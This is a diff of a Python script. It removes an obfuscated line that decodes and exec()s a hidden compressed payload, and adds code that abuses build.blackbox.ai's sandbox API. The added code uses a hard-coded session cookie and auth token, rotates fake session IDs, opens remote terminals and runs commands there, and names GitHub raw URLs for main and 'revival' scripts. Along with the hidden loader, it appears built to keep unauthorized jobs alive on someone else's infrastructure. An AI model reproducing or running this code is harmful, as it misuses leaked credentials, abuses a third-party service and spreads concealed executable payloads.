@@ -1,1 +1,147 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))
+import requests
+import time
+import subprocess
+import random
+import string
+
+# ============================================================================
+# SESSION POOL (50 sessions)
+# ============================================================================
+
+def generate_session_id():
+    timestamp = int(time.time() * 1000)
+    random_code = ''.join(random.choices(string.ascii_lowercase + string.digits, k=9))
+    return f"session_{timestamp}_{random_code}"
+
+SESSION_IDS = [
+    "session_1763294853907_m4mzvgd9r",
+    "session_1763294853908_r826nlsbg",
+    "session_1763294853910_59ncg0uhl",
+    "session_1763294853911_qvfs2ewsj",
+    "session_1763294853913_npm8xd9ra",
+    "session_1763294853914_kgstwm5s8",
+    "session_1763294853916_z4qbfh4xt",
+    "session_1763294853917_rvk0ek13g",
+    "session_1763294853919_gaw0owmw4",
+    "session_1763294853921_kc9bkjcos",
+    "session_1763294853922_zcuigv1qg",
+    "session_1763294853924_tf6yb1f5k",
+    "session_1763294853925_ko725csac",
+    "session_1763294853927_dyf2mpgb0",
+    "session_1763294853928_593lhn92p",
+    "session_1763294853930_b6a1o41mo",
+    "session_1763294853931_sss6068uz",
+    "session_1763294853933_nyqqqdpmx",
+    "session_1763294853934_pmhk482vm",
+    "session_1763294853936_e15dv7gs6",
+    "session_1763294853937_1rkhuhjex",
+    "session_1763294853939_rcrgzfjk2",
+    "session_1763294853940_1d3ym65li",
+    "session_1763294853942_euhs8qrdj",
+    "session_1763294853943_ksj9m2d6a",
+    "session_1763294853945_i3qwn8rbx",
+    "session_1763294853947_ahi5gwumd",
+    "session_1763294853948_bbqtmp099",
+    "session_1763294853950_f15quifxr",
+    "session_1763294853951_olx8w007v",
+    "session_1763294853953_mulmntz7c",
+    "session_1763294853954_5n4grt4hh",
+    "session_1763294853956_a2up27fio",
+    "session_1763294853957_e1bm1f9r1",
+    "session_1763294853959_59jycbogn",
+    "session_1763294853960_uzqhze6cg",
+    "session_1763294853962_n221mxv0p",
+    "session_1763294853963_akdl5eaob",
+    "session_1763294853965_ripbwysg7",
+    "session_1763294853966_urgpki6h8",
+    "session_1763294853968_9ler2aykk",
+    "session_1763294853969_ozpk5swf1",
+    "session_1763294853971_i9qzvnor2",
+    "session_1763294853973_do8rmp4ax",
+    "session_1763294853974_dw1ted1xx",
+    "session_1763294853976_s1yajx8d7",
+    "session_1763294853977_0t9bebdxi",
+    "session_1763294853979_ssj1ggq1n",
+    "session_1763294853980_fhzyn0muy",
+    "session_1763294853982_8rbhh3816",
+]
+
+if len(SESSION_IDS) < 50:
+    for i in range(50 - len(SESSION_IDS)):
+        SESSION_IDS.append(generate_session_id())
+        time.sleep(0.001)
+
+COOKIE_STRING = "intercom-device-id-x55eda6t=57526347-f0e0-4309-a6b0-e42a1c50e99c; __stripe_mid=9b58c873-5a15-4cc9-87d0-368957d993199ffbc5; ph_phc_TXdpocbGVeZVm5VJmAsHTMrCofBQu3e0kN8HGMNGTVW_posthog=%7B%22distinct_id%22%3A%220199e518-a658-7ebd-9944-81f521f1d880%22%2C%22%24sesid%22%3A%5B1760768907411%2C%220199f601-332c-7e4f-a481-50851994be49%22%2C1760768897836%5D%7D; sessionid=66d147dc-3b4c-40b2-955c-791705b6b029; intercom-session-x55eda6t=NVA3REgxYmJiaDgvWnp5anNJcnJpNmJxdzZOZ3Q0c2VqaXdtU1FqL3JzMFpZRUNFR3lVRXlOMEtNdXJYeUx6RUxWUnBzbDRKVU80Y2F5RlJLVnNDa25GWnhPbXFDK2ttcFFSaU90dEk3aEk9LS1QandJUHJuei90ZjJEVzBibG0vTnZRPT0=--639e36a21d5bbe44ee42c42e4cf7379cdd3403fe; __Host-next-auth.csrf-token=16bba1605c4b8ef576fcc73f9738322a90a93e57debcf40d957b7c846a719b28%7C1da500e11659a845c9b54dbcdb1b11c3c786a8591d00e2d5a676aa1757886ff4; __Secure-next-auth.callback-url=https%3A%2F%2Fbuild.blackbox.ai; __stripe_sid=3fd7c91d-f412-44f4-88f6-bf42ee6a6b72bf659e; __Secure-next-auth.session-token=eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2R0NNIn0..0FNNW_P8pu8jeLH4.dd5xzxhS2BDO2p86ZzBHhWsBTIOkUaShDHixw8N1oHMbnKP-d3VtP8Ne6fzElq3c_fjcsEjknJ-encSJlflosi-LJTMr_zuPj1q1w9EDRn6d3dOc4khL9s5RocAe11fwQhcZKwJjWYg3P-94p_piCKtZ8gEBbfyoklbTKGOnqUp3LG9fk54eLHVFuIWj3e4gX5TWM76qmDpo1CPNDNj03Hs12ZOkI3d_Go1Ny5Q_YzQfTl_TzEy3gfJLGgb1GfQqEdsAnqoYmkXJzeZGAG7Z2ZpLFKWVZflc3quNe9zqPsmNWLhbqWu7x64BAlsrmiBUbv0Bb3B3pRbjzMM8S_L6fGM_EagFkb-SB0740VweQU1T1YEy_f84-kh4V2cSPsYWvu6qs02ZdZSwARpk6LWiRHFsQd76sgarDLmTQNC7bpSPxqi3LPLHkw3xRdlAWrr1Qa-LC5-sZR_aYgaQx-dxVtlTbDT5i21lZsf2L8ZwoQmSe10lF4vb_km5r02JqHTOloq0BW7lenOorS-gG1gfyUhmFUM_-Lfblbk5pbW-bOXYMHpKaeHKDxwD8sV0mg.nchQw2ktICTBVxrneGPEhw"
+MAIN_SCRIPT_LINK = "https://raw.githubusercontent.com/beboyya2-cmd/Test/refs/heads/main/main.py"
+REVIVAL_SCRIPT_LINK = "https://raw.githubusercontent.com/beboyya2-cmd/Test/refs/heads/main/revive.py"
+REQUIREMENTS = "requests beautifulsoup4 python-telegram-bot"
+CUSTOM_COMMANDS = []
+
+def parse_cookies(cookie_string):
+    cookies = {}
+    for cookie in cookie_string.split(';'):
+        cookie = cookie.strip()
+        if '=' in cookie:
+            name, value = cookie.split('=', 1)
+            cookies[name] = value
+    return cookies
+
+def create_sandbox(session_id, cookies):
+    url = "https://build.blackbox.ai/api/create-sandbox-for-session"
+    headers = {"accept": "*/*", "content-type": "application/json", "referer": "https://build.blackbox.ai/chat-history"}
+    payload = {"sessionId": session_id, "ports": [3000], "runDevServer": True}
+    try:
+        response = requests.post(url, headers=headers, json=payload, cookies=cookies, timeout=45)
+        data = response.json()
+        return data.get("sandboxId")
+    except:
+        return None
+
+def create_terminal(sandbox_id, cookies):
+    url = "https://build.blackbox.ai/api/terminals/create"
+    headers = {"accept": "*/*", "content-type": "application/json", "referer": f"https://build.blackbox.ai/?sandboxId={sandbox_id}"}
+    payload = {"sandboxId": sandbox_id, "name": f"terminal_{int(time.time() * 1000)}"}
+    response = requests.post(url, headers=headers, json=payload, cookies=cookies, timeout=30)
+    return response.json()["terminal"]["terminalId"]
+
+def execute_command(sandbox_id, terminal_id, command, cookies):
+    url = "https://build.blackbox.ai/api/terminals/execute"
+    headers = {"accept": "*/*", "content-type": "application/json", "referer": f"https://build.blackbox.ai/?sandboxId={sandbox_id}"}
+    payload = {"sandboxId": sandbox_id, "terminalId": terminal_id, "command": command, "workingDirectory": "."}
+    try:
+        requests.post(url, headers=headers, json=payload, cookies=cookies, timeout=10)
+    except:
+        pass
+
+def find_available_session(cookies):
+    shuffled = SESSION_IDS.copy()
+    random.shuffle(shuffled)
+    for session_id in shuffled:
+        sandbox_id = create_sandbox(session_id, cookies)
+        if sandbox_id:
+            return sandbox_id, session_id
+        time.sleep(0.5)
+    new_session = generate_session_id()
+    sandbox_id = create_sandbox(new_session, cookies)
+    if sandbox_id:
+        SESSION_IDS.append(new_session)
+        return sandbox_id, new_session
+    return None, None
+
+time.sleep(14400)
+subprocess.run(["pkill", "-f", "main_script.py"])
+time.sleep(30)
+cookies = parse_cookies(COOKIE_STRING)
+sandbox_id, used_session = find_available_session(cookies)
+if not sandbox_id:
+    exit(1)
+terminal_id = create_terminal(sandbox_id, cookies)
+execute_command(sandbox_id, terminal_id, "sudo dnf install -y python3 python3-pip", cookies)
